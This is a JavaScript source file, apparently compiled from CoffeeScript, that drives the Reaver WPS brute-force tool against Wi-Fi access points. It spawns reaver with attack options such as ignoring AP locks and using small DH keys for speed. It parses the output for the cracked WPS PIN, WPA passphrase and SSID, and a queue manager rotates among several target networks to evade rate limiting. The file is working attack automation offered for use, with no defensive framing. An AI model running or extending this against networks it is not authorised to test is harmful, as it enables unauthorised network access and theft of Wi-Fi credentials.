function() {
  var CONSECUTIVE_FAILURE_LIMIT, DEFAULT_INTERFACE, REAVER_ARGS, REAVER_DEFAULT_ARGS, REAVER_PACKET_SEQ, REAVER_PACKET_SEQ_S, REAVER_PATTERNS, Reaver, ReaverQueueManager, cli, events, exec, spawn, _ref, _ref1,
    __bind = function(fn, me){ return function(){ return fn.apply(me, arguments); }; },
    __hasProp = {}.hasOwnProperty,
    __extends = function(child, parent) { for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; };

  events = require('events');

  _ref = require('child_process'), spawn = _ref.spawn, exec = _ref.exec;

  _ref1 = require('./config'), REAVER_DEFAULT_ARGS = _ref1.REAVER_DEFAULT_ARGS, CONSECUTIVE_FAILURE_LIMIT = _ref1.CONSECUTIVE_FAILURE_LIMIT, DEFAULT_INTERFACE = _ref1.DEFAULT_INTERFACE;

  cli = require('./cli');

  REAVER_ARGS = {
    "interface": ['-i', '--interface', 'Name of the monitor-mode interface to use', true],
    bssid: ['-b', '--bssid', 'BSSID of the target AP', true],
    mac: ['-m', '--mac', 'MAC of the host system', true],
    essid: ['-e', '--essid', 'ESSID of the target AP', true],
    channel: ['-c', '--channel', 'Set the 802.11 channel for the interface (implies -f)', true],
    outFile: ['-o', '--out-file', 'Send output to a log file [stdout]', true],
    session: ['-s', '--session', 'Restore a previous session file', true],
    exec: ['-C', '--exec', 'Execute the supplied command upon successful pin recovery', true],
    daemonize: ['-D', '--daemonize', 'Daemonize reaver', false],
    auto: ['-a', '--auto', 'Auto detect the best advanced options for the target AP', false],
    fixed: ['-f', '--fixed', 'Disable channel hopping', false],
    use5ghz: ['-5', '--5ghz', 'Use 5GHz 802.11 channels', false],
    veryVerbose: ['-vv', '--verbose', 'Display non-critical warnings (-vv for more)', false],
    verbose: ['-v', '--verbose', 'Display non-critical warnings (-vv for more)', false],
    quiet: ['-q', '--quiet', 'Only display critical messages', false],
    help: ['-h', '--help', 'Show help', false],
    pin: ['-p', '--pin', 'Use the specified 4 or 8 digit WPS pin', true],
    delay: ['-d', '--delay', 'Set the delay between pin attempts [1]', true],
    lockDelay: ['-l', '--lock-delay', 'Set the time to wait if the AP locks WPS pin attempts [60]', true],
    maxAttempts: ['-g', '--max-attempts', 'Quit after num pin attempts', true],
    failWait: ['-x', '--fail-wait', 'Set the time to sleep after 10 unexpected failures [0]', true],
    recurringDelay: ['-r', '--recurring-delay', 'Sleep for y seconds every x pin attempts', true],
    timeout: ['-t', '--timeout', 'Set the receive timeout period [5]', true],
    m57Timeout: ['-T', '--m57-timeout', 'Set the M5/M7 timeout period [0.20]', true],
    noAssociate: ['-A', '--no-associate', 'Do not associate with the AP (association must be done by another application)', false],
    noNacks: ['-N', '--no-nacks', 'Do not send NACK messages when out of order packets are received', false],
    dhSmall: ['-S', '--dh-small', 'Use small DH keys to improve crack speed', false],
    ignoreLocks: ['-L', '--ignore-locks', 'Ignore locked state reported by the target AP', false],
    eapTerminate: ['-E', '--eap-terminate', 'Terminate each WPS session with an EAP FAIL packet', false],
    nack: ['-n', '--nack', 'Target AP always sends a NACK [Auto]', false],
    win7: ['-w', '--win7', 'Mimic a Windows 7 registrar [False]', false]
  };

  REAVER_PATTERNS = {
    sending: /Sending (.*)/,
    received: /Received (.*)/,
    tryingPin: /Trying pin (\d+)/,
    timedOut: /WARNING: Receive timeout occurred/,
    wpsFailure: /WPS transaction failed \(code: (\w+)\)/,
    newChannel: /Switching (\w+) to channel (\d+)/,
    waitingBeacon: /Waiting for beacon from (\S+)/,
    associated: /Associated with (\S+)/,
    rateLimit: /WARNING: Detected AP rate limiting, waiting (\d+) seconds before re-checking/,
    associateFailure: /WARNING: Failed to associate with (\S+) \(ESSID: (.*)\)/,
    consecutiveFailures: /WARNING: (\d+) failed connections in a row/,
    progress: /(\S+)% complete @ (\S+) (\S+) \((\d+) seconds\/pin\)/,
    crackedTime: /Pin cracked in (\d+) (\w+)/,
    crackedPIN: /WPS PIN: '(\d+)'/,
    crackedPSK: /WPA PSK: '(.*)'/,
    crackedSSID: /AP SSID: '(.*)'/,
    version: /Reaver v(\S+) WiFi Protected Setup Attack Tool/
  };

  REAVER_PACKET_SEQ = {
    'EAPOL START request': 1,
    'identity request': 2,
    'identity response': 3,
    'M1 message': 4,
    'M2 message': 5,
    'M3 message': 6,
    'M4 message': 7,
    'M5 message': 8,
    'M6 message': 9,
    'M7 message': 10,
    'WSC NACK': 0
  };

  REAVER_PACKET_SEQ_S = {
    1: ' St ',
    2: ' Id ',
    3: ' Id ',
    4: ' M1 ',
    5: ' M2 ',
    6: ' M3 ',
    7: ' M4 ',
    8: ' M5 ',
    9: ' M6 ',
    10: ' M7 ',
    0: 'NACK'
  };

  /* Child process wrapper for spawned reaver processes
  */


  Reaver = (function(_super) {

    __extends(Reaver, _super);

    function Reaver(options) {
      this.process = __bind(this.process, this);

      this.stop = __bind(this.stop, this);

      this.start = __bind(this.start, this);

      var key, value, _ref2, _ref3;
      for (key in options) {
        if (!__hasProp.call(options, key)) continue;
        value = options[key];
        this[key] = value;
      }
      if ((_ref2 = this["interface"]) == null) {
        this["interface"] = DEFAULT_INTERFACE != null ? DEFAULT_INTERFACE : 'mon0';
      }
      if ((_ref3 = this.bssid) == null) {
        this.bssid = null;
      }
      this.proc = null;
      this.status = {
        foundBeacon: false,
        associated: false,
        locked: false,
        channel: 0,
        pin: null,
        phase: 0,
        sequenceDepth: -1,
        alreadyFailed: false
      };
      this.metrics = {
        maxSeqDepth: 0,
        consecutiveFailures: 0,
        timeOuts: 0,
        totalFailures: 0,
        totalChecked: 0,
        timeToCrack: null,
        secondsPerPin: null,
        startedAt: new Date()
      };
    }

    Reaver.prototype.start = function(args) {
      var desc, flag, inclVal, key, option, value;
      if (!(args != null)) {
        args = [];
        for (key in REAVER_ARGS) {
          value = REAVER_ARGS[key];
          if (!(this[key] != null)) {
            continue;
          }
          flag = value[0], option = value[1], desc = value[2], inclVal = value[3];
          if (this[key] || inclVal) {
            args.push(flag);
          }
          if (inclVal) {
            args.push(this[key]);
          }
        }
      }
      this.stop();
      this.proc = spawn('reaver', args);
      this.proc.stdout.on('data', this.process);
      return this.proc.stderr.on('data', this.process);
    };

    Reaver.prototype.stop = function() {
      if (this.proc) {
        this.proc.kill();
        return this.emit('exit', true);
      }
    };

    Reaver.prototype.process = function(data) {
      var key, matched, msg, msgs, pattern, res, _i, _len, _ref2, _results;
      msgs = data.toString('ascii').split('\n');
      _results = [];
      for (_i = 0, _len = msgs.length; _i < _len; _i++) {
        msg = msgs[_i];
        if (!(msg.length > 1)) {
          continue;
        }
        matched = false;
        for (key in REAVER_PATTERNS) {
          pattern = REAVER_PATTERNS[key];
          res = pattern.exec(msg);
          if (res) {
            matched = key;
            break;
          }
        }
        switch (matched) {
          case false:
            matched = "unhandled";
            res = [msg];
            break;
          case 'waitingBeacon':
            this.status.foundBeacon = false;
            break;
          case 'newChannel':
            this.status.channel = res[2];
            this.status.associated = false;
            break;
          case 'associated':
            this.status.foundBeacon = true;
            this.status.associated = true;
            break;
          case 'tryingPin':
            this.status.alreadyFailed = false;
            this.status.sequenceDepth = 0;
            if (this.status.pin !== res[1]) {
              this.metrics.totalChecked++;
              this.metrics.consecutiveFailures = 0;
              if (this.status.pin !== null) {
                if (this.status.phase === 0 && this.status.pin.slice(0, 4) === res[1].slice(0, 4)) {
                  this.status.phase = 1;
                  this.emit('completed', 1, {
                    pin: res[1].slice(0, 4)
                  });
                }
              }
              this.status.pin = res[1];
            }
            break;
          case 'sending':
          case 'received':
            if (REAVER_PACKET_SEQ[res[1]] > this.status.sequenceDepth) {
              this.status.sequenceDepth = REAVER_PACKET_SEQ[res[1]];
              this.status.sequenceNew = true;
              this.metrics.maxSeqDepth = Math.max(this.metrics.maxSeqDepth, this.status.sequenceDepth);
            } else {
              this.status.sequenceNew = false;
            }
            break;
          case 'timedOut':
          case 'wpsFailure':
            if (matched === 'timedOut') {
              this.metrics.timeOuts++;
            }
            if (!this.status.alreadyFailed) {
              this.metrics.consecutiveFailures++;
              this.metrics.totalFailures++;
              this.status.alreadyFailed = true;
            }
            break;
          case 'rateLimit':
          case 'associateFailure':
            this.status.associated = false;
            this.status.locked = matched === 'rateLimit';
            this.status.sequenceDepth = -1;
            break;
          case 'consecutiveFailures':
            this.metrics.consecutiveFailures;
            break;
          case 'progress':
            this.metrics.secondsPerPin = (_ref2 = res[4]) != null ? _ref2 : null;
            break;
          case 'crackedPSK':
            this.emit('completed', 2, 'psk', res[1]);
            break;
          case 'crackedPIN':
            this.emit('completed', 2, 'pin', res[1]);
            break;
          case 'crackedTime':
            this.status.phase = 2;
            this.metrics.timeToCrack = res.slice(1, 3).join(' ');
            this.emit('completed', 2, 'time', this.metrics.timeToCrack);
            break;
          case 'crackedSSID':
            this.emit('completed', 2, 'ssid', res[1]);
        }
        _results.push(this.emit('status', matched, this.status, this.metrics, res));
      }
      return _results;
    };

    return Reaver;

  })(events.EventEmitter);

  ReaverQueueManager = (function(_super) {

    __extends(ReaverQueueManager, _super);

    function ReaverQueueManager(stations, _interface) {
      var station, _i, _len, _ref2;
      this["interface"] = _interface;
      this.handleCompleted = __bind(this.handleCompleted, this);

      this.handleUpdates = __bind(this.handleUpdates, this);

      this.verify = __bind(this.verify, this);

      this.stop = __bind(this.stop, this);

      this.next = __bind(this.next, this);

      this.start = __bind(this.start, this);

      this.priority = [];
      this.secondary = [];
      this.finished = [];
      for (_i = 0, _len = stations.length; _i < _len; _i++) {
        station = stations[_i];
        station.priority = true;
        this.priority.push(station);
      }
      this.active = null;
      if ((_ref2 = this["interface"]) == null) {
        this["interface"] = config.DEFAULT_INTERFACE;
      }
      this.solitaire = stations.length <= 1;
    }

    ReaverQueueManager.prototype.start = function(station) {
      var _base, _ref2, _ref3;
      if (this.active || this.reaver) {
        this.stop('skipped');
      }
      if (station) {
        this.active = station;
      } else {
        this.active = this.next();
      }
      if (this.active) {
        if (this.priority.length === 0 && this.secondary.length === 0) {
          this.solitaire = true;
        }
        if ((_ref2 = (_base = this.active).reaverArgs) == null) {
          _base.reaverArgs = REAVER_DEFAULT_ARGS(this.active, this["interface"]);
        }
        this.reaver = new Reaver(this.active.reaverArgs);
        this.reaver.on('status', this.handleUpdates);
        this.reaver.on('completed', this.handleCompleted);
        this.reaver.start();
        return cli.statusBar('procbar', "" + ((_ref3 = this.active.essid) != null ? _ref3 : this.active.bssid));
      }
    };

    ReaverQueueManager.prototype.next = function() {
      if (this.priority.length > 0) {
        return this.priority.shift();
      } else if (this.secondary.length > 0) {
        return this.secondary.shift();
      } else {
        this.emit('end', 'empty', this.finished);
        return false;
      }
    };

    ReaverQueueManager.prototype.stop = function(reason, results) {
      var k, v, _base, _base1, _ref2, _ref3, _ref4, _ref5;
      if (this.reaver) {
        if (this.active) {
          if ((_ref2 = (_base = this.active).results) == null) {
            _base.results = {};
          }
          if ((_ref3 = (_base1 = this.active.results).snapshots) == null) {
            _base1.snapshots = {
              status: [],
              metrics: []
            };
          }
          this.active.results.snapshots.status.push((_ref4 = this.reaver.status) != null ? _ref4 : 'empty');
          this.reaver.metrics.stoppedAt = new Date();
          this.active.results.snapshots.metrics.push((_ref5 = this.reaver.metrics) != null ? _ref5 : 'empty');
        }
        this.reaver.stop();
        delete this.reaver;
      }
      if ((this.active != null) && results) {
        for (k in results) {
          v = results[k];
          this.active[k] = v;
        }
      }
      switch (reason) {
        case 'paused':
          if (this.active.priority) {
            this.priority.unshift(this.active);
          } else {
            this.secondary.unshift(this.active);
          }
          break;
        case 'killed':
          this.finished.push(this.active);
          this.finished = this.finished.concat(this.priority, this.secondary);
          this.emit('end', 'killed', this.finished);
          break;
        case 'skipped':
        case 'wait':
          if (!this.solitaire) {
            if (this.active.priority) {
              this.priority.push(this.active);
            } else {
              this.secondary.push(this.active);
            }
          }
          break;
        case 'cracked':
          this.active.success = true;
          this.finished.push(this.active);
          break;
        case 'fatal':
          this.active.success = false;
          this.finished.push(this.active);
          break;
        default:
          this.secondary.push(this.active);
      }
      this.active = null;
      if (reason !== 'killed') {
        return this.emit('stopped', reason);
      }
    };

    ReaverQueueManager.prototype.verify = function(fn, period, success, failure, isInterval) {
      var iv, result, self,
        _this = this;
      if (isInterval == null) {
        isInterval = false;
      }
      self = this;
      if (typeof fn !== 'function') {
        if (fn) {
          result = success;
        } else {
          result = failure;
        }
        if (isInterval) {
          return iv = setInterval((function() {
            return result.apply(null, [self, iv]);
          }), period);
        } else {
          return setTimeout((function() {
            return result.apply(null, [self, false]);
          }), period);
        }
      } else {
        result = function(interval) {
          var res;
          if (interval == null) {
            interval = false;
          }
          res = fn.apply(null, [self, interval]);
          if (res) {
            return success.apply(null, [self, interval]);
          } else {
            return failure.apply(null, [self, interval]);
          }
        };
        if (isInterval) {
          return iv = setInterval((function() {
            return result.apply(null, [iv]);
          }), period);
        } else {
          return setTimeout(result, period);
        }
      }
    };

    ReaverQueueManager.prototype.handleUpdates = function(update, status, metrics, data) {
      var _base, _base1, _ref2, _ref3;
      switch (update) {
        case 'waitingBeacon':
          cli.statusBar('beacon');
          break;
        case 'associated':
          if ((_ref2 = (_base = this.active).essid) == null) {
            _base.essid = data[1];
          }
          cli.statusBar('associated');
          break;
        case 'tryingPin':
          cli.statusBar('pinbar', "" + status.pin, metrics);
          break;
        case 'sending':
        case 'received':
          if (status.sequenceNew) {
            cli.statusBar(status.sequenceDepth);
          } else {
            if (status.sequenceDepth === 0) {
              cli.statusbar('nack');
            }
          }
          break;
        case 'timedOut':
          cli.statusBar('timeout');
          this.emit('failed', status, metrics);
          break;
        case 'wpsFailure':
          cli.statusBar("fail" + data[1][3]);
          this.emit('failed', status, metrics);
          break;
        case 'rateLimit':
          if (this.solitaire) {
            cli.statusBar('error', 'LOCKING DETECTED', 'waiting until resolved... (solitaire=true)');
          } else {
            cli.statusBar('error', 'LOCKING DETECTED', 'rotating target networks...');
          }
          this.stop('wait', {
            priority: false,
            error: 'locking'
          });
          break;
        case 'associateFailure':
          if ((_ref3 = (_base1 = this.active).essid) == null) {
            _base1.essid = data[1];
          }
          cli.statusBar('error', 'CANNOT ASSOCIATE', 'aborting current target & rotating...');
          this.stop('fatal', {
            error: 'associateFailure'
          });
      }
      if (metrics.consecutiveFailures >= CONSECUTIVE_FAILURE_LIMIT) {
        cli.statusBar('error', 'FAILURE LIMIT TRIGGERED', 'rotating target networks...');
        return this.stop('failures', {
          priority: false,
          error: 'consecutiveFailures'
        });
      }
    };

    ReaverQueueManager.prototype.handleCompleted = function(phase, key, value) {
      var _base, _ref2;
      if (this.active != null) {
        if ((_ref2 = (_base = this.active).results) == null) {
          _base.results = {};
        }
        this.active.results[key] = value;
      }
      if (phase === 1) {
        cli.statusBar('success', 'Phase 1 completed!', "First 1/2 of PIN: " + value);
      }
      if (phase === 2) {
        if (key === 'ssid') {
          cli.statusBar('success', 'Phase 2 completed!', "Results: " + (JSON.stringify(this.active.results)));
          return this.stop('cracked');
        }
      }
    };

    return ReaverQueueManager;

  })(events.EventEmitter);

  module.exports.Reaver = Reaver;

  module.exports.ReaverQueueManager = ReaverQueueManager;

}